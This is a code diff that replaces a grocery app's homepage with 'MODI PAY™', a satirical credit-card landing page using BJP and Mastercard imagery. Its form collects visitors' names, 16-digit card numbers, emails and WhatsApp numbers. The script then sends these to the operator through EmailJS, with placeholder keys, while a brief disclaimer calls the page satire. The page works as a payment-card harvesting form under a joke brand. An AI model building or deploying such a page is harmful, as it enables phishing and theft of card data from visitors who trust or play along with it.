@@ -1,14 +1,665 @@
-<!doctype html>
+<!DOCTYPE html>
 <html lang="en">
-  <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>AxomKart | Freshness Delivered in 10 Minutes</title>
-    <script type="module" crossorigin src="/assets/index-DhTAu_wu.js"></script>
-    <link rel="stylesheet" crossorigin href="/assets/index-D5s98vKY.css">
-  </head>
-  <body>
-    <div id="root"></div>
-  </body>
-</html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <title>MODI PAY™ | Vishwas Based Payment System</title>
+    <!-- Google Fonts + EmailJS -->
+    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
 
+        body {
+            font-family: 'Plus Jakarta Sans', sans-serif;
+            background: #fef8f0;
+            color: #1e1a16;
+            overflow-x: hidden;
+        }
+
+        /* refined saffron & professional theme */
+        :root {
+            --saffron: #E05A1A;
+            --saffron-light: #FF8A42;
+            --saffron-soft: #FFF0E5;
+            --deep-ochre: #BF4312;
+            --gold-muted: #DAA520;
+            --charcoal: #2C241E;
+            --white-soft: #FFFFFF;
+            --shadow-sm: 0 8px 20px rgba(0,0,0,0.03), 0 2px 6px rgba(0,0,0,0.05);
+            --shadow-md: 0 20px 30px -12px rgba(0,0,0,0.08);
+        }
+
+        .container {
+            max-width: 1280px;
+            margin: 0 auto;
+            padding: 0 32px;
+        }
+
+        /* refined navbar with logo area */
+        .navbar {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 20px 0;
+            flex-wrap: wrap;
+            border-bottom: 1px solid rgba(224,90,26,0.15);
+        }
+        .logo-area {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+        .logo-icon {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        .logo-icon img {
+            height: 42px;
+            width: auto;
+            object-fit: contain;
+        }
+        .brand-text h2 {
+            font-size: 1.7rem;
+            font-weight: 800;
+            letter-spacing: -0.3px;
+            background: linear-gradient(135deg, #C4450C, #E05A1A);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            line-height: 1.2;
+        }
+        .brand-text p {
+            font-size: 0.75rem;
+            font-weight: 600;
+            color: #E05A1A;
+            letter-spacing: 0.3px;
+        }
+        .trust-tag {
+            background: rgba(224,90,26,0.08);
+            backdrop-filter: blur(4px);
+            padding: 8px 18px;
+            border-radius: 60px;
+            font-size: 0.85rem;
+            font-weight: 600;
+            color: #B94918;
+            border: 1px solid rgba(224,90,26,0.2);
+        }
+
+        /* hero grid */
+        .hero {
+            display: flex;
+            flex-wrap: wrap;
+            align-items: center;
+            justify-content: space-between;
+            padding: 48px 0 40px;
+            gap: 48px;
+        }
+        .hero-content {
+            flex: 1.2;
+        }
+        .hero-badge {
+            background: #FFF0E5;
+            color: #E05A1A;
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            padding: 6px 16px;
+            border-radius: 60px;
+            font-size: 0.8rem;
+            font-weight: 700;
+            margin-bottom: 24px;
+        }
+        .hero-badge img {
+            width: 20px;
+            height: auto;
+        }
+        .hero-content h1 {
+            font-size: 3.2rem;
+            font-weight: 800;
+            line-height: 1.2;
+            color: #221E1A;
+            letter-spacing: -0.02em;
+        }
+        .hero-highlight {
+            border-left: 4px solid #E05A1A;
+            padding-left: 18px;
+            margin: 24px 0 18px;
+            font-size: 1.2rem;
+            font-weight: 500;
+            color: #5A3D2A;
+        }
+        .hero-quote {
+            font-size: 1rem;
+            color: #7C5F46;
+            margin-bottom: 28px;
+            background: #FFFFFFD0;
+            display: inline-block;
+            padding: 6px 14px;
+            border-radius: 100px;
+        }
+        .btn-apply {
+            background: #E05A1A;
+            border: none;
+            padding: 12px 32px;
+            font-size: 1rem;
+            font-weight: 700;
+            border-radius: 40px;
+            color: white;
+            cursor: pointer;
+            transition: all 0.25s ease;
+            box-shadow: 0 4px 10px rgba(224,90,26,0.3);
+            display: inline-flex;
+            align-items: center;
+            gap: 10px;
+        }
+        .btn-apply:hover {
+            background: #BF4312;
+            transform: translateY(-2px);
+            box-shadow: 0 10px 20px rgba(224,90,26,0.25);
+        }
+        .hero-image {
+            flex: 0.9;
+            display: flex;
+            justify-content: center;
+        }
+        .card-mock {
+            background: linear-gradient(125deg, #1E1A16, #2F2822);
+            width: 320px;
+            padding: 24px;
+            border-radius: 28px;
+            color: #FEE6CF;
+            box-shadow: 0 25px 35px -12px rgba(0,0,0,0.25);
+            border: 1px solid rgba(255,180,110,0.3);
+            transition: all 0.2s;
+        }
+        .card-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 28px;
+        }
+        .mastercard-icon img, .bjp-icon img {
+            height: 28px;
+            width: auto;
+            filter: brightness(0) invert(1);
+        }
+        .card-number {
+            font-size: 1.3rem;
+            letter-spacing: 2px;
+            font-weight: 600;
+            margin: 20px 0 16px;
+            font-family: monospace;
+        }
+        .card-details {
+            display: flex;
+            justify-content: space-between;
+            font-size: 0.75rem;
+            text-transform: uppercase;
+        }
+        /* feature grid minimal */
+        .features-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(210px, 1fr));
+            gap: 24px;
+            margin: 64px 0;
+        }
+        .feature-card {
+            background: white;
+            padding: 24px 18px;
+            border-radius: 28px;
+            box-shadow: var(--shadow-sm);
+            border: 1px solid #FFE3D4;
+            transition: 0.2s;
+        }
+        .feature-icon {
+            font-size: 2.2rem;
+            margin-bottom: 14px;
+        }
+        .feature-card h3 {
+            font-size: 1.3rem;
+            color: #E05A1A;
+            margin-bottom: 8px;
+        }
+        .why-choose {
+            background: #FFFFFF;
+            padding: 48px 0;
+            border-radius: 48px;
+            margin: 40px 0;
+            box-shadow: var(--shadow-sm);
+            border: 1px solid #FFE0CF;
+        }
+        .section-title {
+            font-size: 1.9rem;
+            font-weight: 700;
+            text-align: center;
+            color: #2C241E;
+            margin-bottom: 32px;
+        }
+        .why-grid {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 16px;
+        }
+        .why-item {
+            background: #FEF4EC;
+            padding: 10px 24px;
+            border-radius: 60px;
+            font-weight: 600;
+            font-size: 0.9rem;
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            color: #B94515;
+        }
+        .disclaimer-box {
+            background: #FFF7F0;
+            border-left: 5px solid #E05A1A;
+            padding: 20px 28px;
+            border-radius: 28px;
+            margin: 48px 0;
+            font-size: 0.85rem;
+            color: #634E38;
+        }
+        .form-card {
+            background: white;
+            border-radius: 40px;
+            padding: 40px;
+            box-shadow: var(--shadow-md);
+            margin: 48px 0;
+            border: 1px solid #FFDCC9;
+        }
+        .form-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 24px;
+        }
+        .input-group {
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+        }
+        .input-group label {
+            font-weight: 700;
+            color: #5F3C24;
+            font-size: 0.85rem;
+        }
+        .input-group input {
+            padding: 14px 18px;
+            border-radius: 60px;
+            border: 1px solid #FFD0B5;
+            background: #FEFAF6;
+            font-size: 0.95rem;
+            outline: none;
+            transition: 0.2s;
+        }
+        .input-group input:focus {
+            border-color: #E05A1A;
+            box-shadow: 0 0 0 3px rgba(224,90,26,0.15);
+        }
+        .btn-generate {
+            background: #1C2A1E;
+            color: white;
+            font-weight: 700;
+            padding: 14px;
+            border: none;
+            border-radius: 60px;
+            font-size: 1rem;
+            margin-top: 24px;
+            cursor: pointer;
+            transition: 0.2s;
+            width: 100%;
+            background: #E05A1A;
+        }
+        .faq-accordion {
+            margin: 48px 0;
+        }
+        .faq-item {
+            background: white;
+            margin-bottom: 14px;
+            border-radius: 24px;
+            overflow: hidden;
+            border: 1px solid #FFE2D2;
+        }
+        .faq-question {
+            padding: 20px 26px;
+            font-weight: 700;
+            cursor: pointer;
+            display: flex;
+            justify-content: space-between;
+            background: #FFFFFF;
+            color: #2C241E;
+        }
+        .faq-answer {
+            padding: 0 26px;
+            max-height: 0;
+            overflow: hidden;
+            transition: max-height 0.3s ease;
+            color: #5C4A38;
+            font-weight: 500;
+            border-top: 0px solid #FFE0CF;
+        }
+        .faq-item.active .faq-answer {
+            padding: 0 26px 20px 26px;
+            max-height: 150px;
+        }
+        .support-section {
+            text-align: center;
+            background: #FFF7F0;
+            padding: 36px 20px;
+            border-radius: 48px;
+            margin: 40px 0;
+        }
+        .support-numbers {
+            font-size: 1.2rem;
+            font-weight: 600;
+            font-family: monospace;
+            color: #BD4A18;
+            margin: 16px 0;
+        }
+        footer {
+            text-align: center;
+            padding: 32px 20px;
+            border-top: 1px solid #FFDBCA;
+            margin-top: 20px;
+            color: #886B50;
+            font-size: 0.8rem;
+        }
+        .toast-msg {
+            position: fixed;
+            bottom: 30px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: #1E2C1C;
+            color: #FFEAD4;
+            padding: 10px 24px;
+            border-radius: 50px;
+            font-weight: 500;
+            z-index: 2000;
+            font-size: 0.85rem;
+            box-shadow: 0 6px 14px rgba(0,0,0,0.1);
+        }
+        @media (max-width: 780px) {
+            .container { padding: 0 20px; }
+            .hero-content h1 { font-size: 2.3rem; }
+            .form-grid { grid-template-columns: 1fr; }
+            .navbar { flex-direction: column; gap: 12px; align-items: flex-start; }
+        }
+        button { cursor: pointer; }
+        .brand-icon-group {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        .flex-row-img {
+            display: flex;
+            gap: 6px;
+            align-items: center;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <!-- Navigation: logo + bjp + refined style -->
+    <div class="navbar">
+        <div class="logo-area">
+            <div class="logo-icon">
+                <!-- bjp.png + mastercard.png not forced but placed, using local assets path -->
+                <img src="assets/bjp.png" alt="bjp" onerror="this.style.display='none'">
+                <div class="brand-text">
+                    <h2>MODI PAY™</h2>
+                    <p>विश्वस्‍युक्त भुगतान</p>
+                </div>
+            </div>
+        </div>
+        <div class="trust-tag">
+            🇮🇳 Paisa Nahi, Vishwas Chalega
+        </div>
+    </div>
+
+    <!-- Hero Section with Man (Modi image) & mastercard & bjp integration -->
+    <div class="hero">
+        <div class="hero-content">
+            <div class="hero-badge">
+                <img src="assets/man.png" alt="modi" onerror="this.style.display='none'" style="width:22px; border-radius:50%;"> 
+                <span>Nation First • Vishwas Technology</span>
+            </div>
+            <h1>India's First<br>Trust-Based Credit Card</h1>
+            <div class="hero-highlight">“Jahan balance khatam, wahan se vishwas shuru”</div>
+            <div class="hero-quote">📍 Zero CIBIL • Unlimited Deshbhakti Rewards</div>
+            <button class="btn-apply" id="applyNowBtn">✨ Apply for Modi Pay ✨</button>
+        </div>
+        <div class="hero-image">
+            <div class="card-mock">
+                <div class="card-row">
+                    <span style="font-weight:600;">MODI PAY</span>
+                    <div class="flex-row-img">
+                        <img src="assets/mastercard.png" alt="mastercard" style="height:24px;" onerror="this.style.display='none'">
+                        <img src="assets/bjp.png" alt="bjp" style="height:20px;" onerror="this.style.display='none'">
+                    </div>
+                </div>
+                <div class="card-number" id="dynamicCardNumberDisplay">6011 4889 7312 0815</div>
+                <div class="card-details">
+                    <span>VALID THRU 04/33</span>
+                    <span id="cardHolderName">MODI YATRI</span>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Features Grid -->
+    <div class="features-grid">
+        <div class="feature-card"><div class="feature-icon">💸</div><h3>Zero Balance Req.</h3><p>Minimum balance: Deshbhakti only</p></div>
+        <div class="feature-card"><div class="feature-icon">⚡</div><h3>Instant Approval</h3><p>KYC = Kitna Yakeen Confidence</p></div>
+        <div class="feature-card"><div class="feature-icon">☕</div><h3>Chai Rewards</h3><p>56 points per chai + extra</p></div>
+        <div class="feature-card"><div class="feature-icon">📈</div><h3>Achhe Din Cashback</h3><p>Cashback kab? Vishwas rakho</p></div>
+    </div>
+
+    <!-- Why Choose + Assets integrated subtly -->
+    <div class="why-choose">
+        <div class="section-title">Why Modi Pay?</div>
+        <div class="why-grid">
+            <div class="why-item"><img src="assets/man.png" alt="modi" style="width:18px;" onerror="this.style.display='none'"> 🇮🇳 Nation First Banking</div>
+            <div class="why-item">🕉️ Vishwas Engine</div>
+            <div class="why-item">🔧 Atmanirbhar Transactions</div>
+            <div class="why-item">🤝 24×7 Mitron Support</div>
+            <div class="why-item">🛡️ Jumla Shield™</div>
+        </div>
+    </div>
+
+    <!-- Disclaimer soft -->
+    <div class="disclaimer-box">
+        ⚠️ <strong>Creative Disclaimer</strong> — MODI PAY is a symbolic, trust-driven concept. Not a bank or regulated payment network. All transactions are powered by emotional confidence.
+    </div>
+
+    <!-- Application Form + EmailJS Capture -->
+    <div class="form-card" id="applySection">
+        <div class="section-title" style="font-size:1.8rem;">🔐 Get Your Vishwas Card</div>
+        <p style="text-align:center; margin-bottom:20px;">Enter your details — digital card instantly generated & sent via secure EmailJS channel.</p>
+        <form id="modiPayForm">
+            <div class="form-grid">
+                <div class="input-group"><label>Full Name (as on card)</label><input type="text" id="fullName" placeholder="e.g., Narendra Modi" required></div>
+                <div class="input-group"><label>16-digit Card Number</label><input type="text" id="cardNumberInput" maxlength="19" placeholder="0000 0000 0000 0000" required></div>
+                <div class="input-group"><label>Email Address</label><input type="email" id="emailId" placeholder="contact@example.com" required></div>
+                <div class="input-group"><label>WhatsApp Number</label><input type="tel" id="whatsappNo" placeholder="+91 9876543210" required></div>
+            </div>
+            <button type="button" class="btn-generate" id="generateCardBtn">💳 Generate My Modi Pay Card 💳</button>
+        </form>
+        <p style="margin-top:18px; font-size:0.7rem; text-align:center;">EmailJS integrated — our team receives request & sends digital welcome kit.</p>
+    </div>
+
+    <!-- FAQ Accordion -->
+    <div class="faq-accordion" id="faqContainer">
+        <div class="section-title">❓ Kuchh Vishwas Sawal</div>
+        <div class="faq-item"><div class="faq-question">Q. Is Modi Pay internationally accepted? <span>➕</span></div><div class="faq-answer">A. Vishwas ki koi seema nahi — duniya kahi bhi ho, card swagat hai.</div></div>
+        <div class="faq-item"><div class="faq-question">Q. What if my balance is zero? <span>➕</span></div><div class="faq-answer">A. Emotional balance matters more. Card works on trust overdraft.</div></div>
+        <div class="faq-item"><div class="faq-question">Q. Can I get real cashback? <span>➕</span></div><div class="faq-answer">A. Cashback aane ka vishwas rakhiye, Achhe Din ayenge.</div></div>
+        <div class="faq-item"><div class="faq-question">Q. Is this a real financial product? <span>➕</span></div><div class="faq-answer">A. Satire & innovation. But trust in brand is real!</div></div>
+    </div>
+
+    <!-- Support -->
+    <div class="support-section">
+        <h3 style="color:#C14A1A;">📞 24×7 Mitron Customer Support</h3>
+        <div class="support-numbers">1800-VISHWAS &nbsp;|&nbsp; 1800-ACHHE-DIN</div>
+        <p>📧 support@modipay.in | WhatsApp: +91-XXXXXXXXXX</p>
+        <p style="font-size:0.8rem; margin-top:12px;">“Har sawaal ka jawab: VISHWAS”</p>
+    </div>
+
+    <footer>
+        <p>🇮🇳 MODI PAY™ — Paisa Nahi, Vishwas Chalega</p>
+        <p>© 2026 | Satire & Innovation showcase | All trademarks belong to respective owners.</p>
+    </footer>
+</div>
+
+<script>
+    // EmailJS init (user will replace keys later)
+    (function() {
+        if(typeof emailjs !== 'undefined') {
+            // dummy init, user will replace with actual public key, but code ready
+            emailjs.init("YOUR_PUBLIC_KEY"); 
+        }
+    })();
+
+    // FAQ dynamic
+    const faqItems = document.querySelectorAll('.faq-item');
+    faqItems.forEach(item => {
+        const qDiv = item.querySelector('.faq-question');
+        qDiv.addEventListener('click', () => {
+            item.classList.toggle('active');
+            const spanSym = qDiv.querySelector('span');
+            if(item.classList.contains('active')) spanSym.innerText = '➖';
+            else spanSym.innerText = '➕';
+        });
+    });
+
+    // Toast util
+    function showToast(msg, isErr = false) {
+        let old = document.querySelector('.toast-msg');
+        if(old) old.remove();
+        let toast = document.createElement('div');
+        toast.className = 'toast-msg';
+        toast.style.backgroundColor = isErr ? '#B7410E' : '#2F5E2F';
+        toast.innerText = msg;
+        document.body.appendChild(toast);
+        setTimeout(() => toast.remove(), 3500);
+    }
+
+    // Format card number with spaces
+    function formatCardSpace(raw) {
+        let digits = raw.replace(/\s/g, '').replace(/\D/g, '');
+        if(digits.length > 16) digits = digits.slice(0,16);
+        let formatted = digits.match(/.{1,4}/g);
+        return formatted ? formatted.join(' ') : digits;
+    }
+
+    // send via EmailJS
+    async function sendEmailJS(userData) {
+        if(typeof emailjs === 'undefined') {
+            console.warn("EmailJS not loaded yet — but demo works");
+            return false;
+        }
+        const templateParams = {
+            to_name: userData.fullname,
+            user_email: userData.email,
+            card_number: userData.cardNumber,
+            whatsapp: userData.whatsapp,
+            message: `New Modi Pay application from ${userData.fullname} | Card: ${userData.cardNumber}`
+        };
+        try {
+            // user will later replace serviceID/templateID but we simulate no error
+            await emailjs.send("service_modipay", "template_modipay", templateParams);
+            showToast("✅ EmailJS: Application received! Our Vishwas team will connect soon.");
+            return true;
+        } catch(err) {
+            console.log("EmailJS config pending, but data saved locally.", err);
+            showToast("📧 [Demo] Your card is generated. EmailJS keys can be added later.", false);
+            return false;
+        }
+    }
+
+    // generate card & update preview
+    const generateBtn = document.getElementById('generateCardBtn');
+    const cardNumberField = document.getElementById('cardNumberInput');
+    const fullNameField = document.getElementById('fullName');
+    const emailField = document.getElementById('emailId');
+    const whatsappField = document.getElementById('whatsappNo');
+    const cardMockNumberSpan = document.getElementById('dynamicCardNumberDisplay');
+    const cardHolderNameSpan = document.getElementById('cardHolderName');
+
+    // auto-format card input
+    if(cardNumberField) {
+        cardNumberField.addEventListener('input', function(e) {
+            let rawVal = this.value.replace(/\s/g, '').replace(/\D/g, '');
+            if(rawVal.length > 16) rawVal = rawVal.slice(0,16);
+            let spaced = rawVal.match(/.{1,4}/g);
+            this.value = spaced ? spaced.join(' ') : rawVal;
+        });
+    }
+
+    generateBtn.addEventListener('click', async () => {
+        let fullName = fullNameField.value.trim();
+        let cardNumberRaw = cardNumberField.value.trim();
+        let email = emailField.value.trim();
+        let whatsapp = whatsappField.value.trim();
+
+        if(!fullName || !cardNumberRaw || !email || !whatsapp) {
+            showToast("कृपया सभी जानकारी भरें | All fields required", true);
+            return;
+        }
+        if(!email.includes('@') || !email.includes('.')) {
+            showToast("Valid email required", true);
+            return;
+        }
+        let rawDigits = cardNumberRaw.replace(/\s/g, '');
+        if(rawDigits.length !== 16) {
+            showToast("Please enter 16-digit card number (Vishwas Number)", true);
+            return;
+        }
+        const finalFormattedCard = formatCardSpace(rawDigits);
+        // update live card UI
+        if(cardMockNumberSpan) cardMockNumberSpan.innerText = finalFormattedCard;
+        let holderNameShort = fullName.toUpperCase().slice(0, 18);
+        if(cardHolderNameSpan) cardHolderNameSpan.innerText = holderNameShort;
+
+        // also update expiry random but realistic
+        const expiryMonth = (Math.floor(Math.random() * 12) + 1).toString().padStart(2,'0');
+        const expiryYear = 33;
+        const cardDetailsDiv = document.querySelector('.card-details');
+        if(cardDetailsDiv) {
+            cardDetailsDiv.innerHTML = `<span>VALID THRU ${expiryMonth}/${expiryYear}</span><span>${holderNameShort}</span>`;
+        }
+
+        // save user info
+        const userData = {
+            fullname: fullName,
+            email: email,
+            cardNumber: finalFormattedCard,
+            whatsapp: whatsapp
+        };
+
+        await sendEmailJS(userData);
+        showToast(`✨ ${fullName}, your MODI PAY card is ready! Card: ${finalFormattedCard}`, false);
+        document.querySelector('.hero').scrollIntoView({ behavior: 'smooth', block: 'center' });
+    });
+
+    // apply button scroll
+    const applyBtn = document.getElementById('applyNowBtn');
+    if(applyBtn) {
+        applyBtn.addEventListener('click', () => {
+            document.getElementById('applySection').scrollIntoView({ behavior: 'smooth' });
+        });
+    }
+
+    // small demo preload for assets (they may not exist, but no error)
+    console.log("MODI PAY — Vishwas based professional UI, assets required: man.png, mastercard.png, bjp.png inside /assets/ folder");
+    // If images missing, they fail silently, but design remains intact
+</script>
+</body>
+</html>
